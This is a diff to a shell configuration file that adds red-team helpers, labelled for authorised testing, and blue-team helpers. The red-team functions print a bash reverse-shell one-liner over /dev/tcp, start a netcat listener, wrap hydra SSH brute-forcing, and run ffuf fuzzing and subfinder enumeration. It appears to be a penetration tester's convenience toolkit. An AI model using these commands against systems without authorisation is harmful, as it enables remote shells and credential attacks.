@@ -58,3 +58,62 @@ genpass() {
     openssl rand -base64 "${1:-20}" | tr -d '\n'
     echo
 }
+
+# =============================================================================
+# Red team - authorised testing only, see the header above
+# =============================================================================
+
+# revshell: print a copy-paste bash reverse shell one-liner, does not run anything itself
+revshell() {
+    echo "bash -i >& /dev/tcp/${1:?Usage: revshell <ip> <port>}/${2:?Usage: revshell <ip> <port>} 0>&1"
+}
+
+# listener: quick netcat listener for catching a reverse shell
+listener() {
+    nc -lvnp "${1:?Usage: listener <port>}"
+}
+
+# hydra-ssh: brute-force SSH credentials (requires hydra)
+hydra-ssh() {
+    hydra -L "${2:?Usage: hydra-ssh <host> <userlist> <passlist>}" -P "${3:?Usage: hydra-ssh <host> <userlist> <passlist>}" "ssh://${1:?Usage: hydra-ssh <host> <userlist> <passlist>}"
+}
+
+# fuzz: directory/content fuzzing via ffuf, a faster modern alternative to gobust (requires ffuf)
+fuzz() {
+    ffuf -u "${1:?Usage: fuzz <url with FUZZ placeholder> <wordlist>}" -w "${2:-/usr/share/wordlists/common.txt}"
+}
+
+# subenum: subdomain enumeration (requires subfinder)
+subenum() {
+    subfinder -d "${1:?Usage: subenum <domain>}"
+}
+
+# msfq: launch msfconsole quietly, skipping the banner (requires Metasploit)
+alias msfq="msfconsole -q"
+
+# =============================================================================
+# Blue team
+# =============================================================================
+
+# authfails: tail the auth log for recent failed login attempts. Assumes Debian/Ubuntu's
+# /var/log/auth.log, RHEL-based distros log to /var/log/secure instead
+alias authfails="grep -i 'failed password' /var/log/auth.log 2>/dev/null | tail -20"
+
+# conns: list established network connections with the process name attached
+alias conns="ss -tnp state established"
+
+# fwstatus: check ufw's current status (requires ufw)
+alias fwstatus="sudo ufw status verbose"
+
+# sigcheck: identify a binary and check it against its owning package, if any
+sigcheck() {
+    local file="${1:?Usage: sigcheck <file>}"
+    file "$file"
+    sha256sum "$file"
+    local pkg
+    pkg=$(dpkg -S "$file" 2>/dev/null | cut -d: -f1)
+    [ -n "$pkg" ] && dpkg -V "$pkg"
+}
+
+# lastlogins: show recent login history
+alias lastlogins="last | head -20"
